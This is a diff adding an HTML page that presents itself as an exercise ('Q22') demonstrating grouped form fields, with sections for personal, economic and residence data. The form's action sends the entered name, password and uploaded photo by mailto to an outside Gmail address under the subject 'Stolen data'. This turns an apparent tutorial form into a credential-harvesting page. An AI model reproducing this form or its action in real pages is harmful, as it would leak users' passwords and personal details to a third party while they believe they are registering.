@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Q22</title>
+</head>
+<body>
+    <h3>Demonstrates creating HTML Form with Grouping</h3>
+    <form action="mailto:anew3008@gmail.com?subject=Stolen%20data" method="post" enctype="text/plain">
+        <fieldset >
+            <legend>Personal Information</legend>
+            <label for="name">Name:</label>
+            <input type="text" name="name" id="name"> <br> <br>
+            <label for="password">Password:</label>
+            <input type="password" name="password" id="password"> <br> <br>
+            <label for="gender" >Gender:</label>
+            <input type="radio" name="gender" id="male" value="male"> 
+            <label for="male">Male</label>
+            <input type="radio" name="gender" id="female" value="female"> 
+            <label for="female">Female</label> <br><br> 
+            <label for="photo">Upload Your Personal Photo:</label>
+            <input type="file" name="photo" id="photo">
+        </fieldset> <br>
+        
+        <fieldset>
+            <legend>Economic Data</legend>
+            <label for="Vehicle">Vehicle Type :  </label>
+            <input type="checkbox" name="Bike" id="Bike" value="Bike">
+            <label for="Bike">Bike</label>
+            <input type="checkbox" name="Car" id="Car" value="Car">
+            <label for="Car">Car</label>
+            <input type="checkbox" name="SUV" id="SUV" value="SUV">
+            <label for="SUV">SUV</label>
+            <input type="checkbox" name="Cycle" id="Cycle" value="Cycle"> 
+            <label for="Cycle">Cycle</label> <br><br>
+
+            <label for="Countries">Countries: </label>
+            <select name="Countries" id="Countries">
+                <option value="USA">USA</option>
+                <option value="Egypt">Egypt</option>
+                <option value="KSA">KSA</option>
+                <option value="UAE">UAE</option>
+            </select> <br><br>
+            <label for="Companies">Companies: </label><br>
+            <select name="Companies" id="Companies" multiple>
+                <option value="Audi">Audi</option>
+                <option value="Mercedes">Mercedes</option>
+                <option value="Volvo">Volvo</option>
+                <option value="Toyota">Toyota</option>
+            </select> 
+        </fieldset><br>
+
+        <fieldset>
+            <legend>Residence Data</legend>
+            <label for="Address">Address: </label><br>
+            <textarea name="Address" id="Address" rows="5" cols="50"></textarea><br><br>
+            <input type="submit" value="Register">
+            <input type="reset" value="Clear">
+        
+        </fieldset>
+
+
+    </form>
+</body>
+</html>
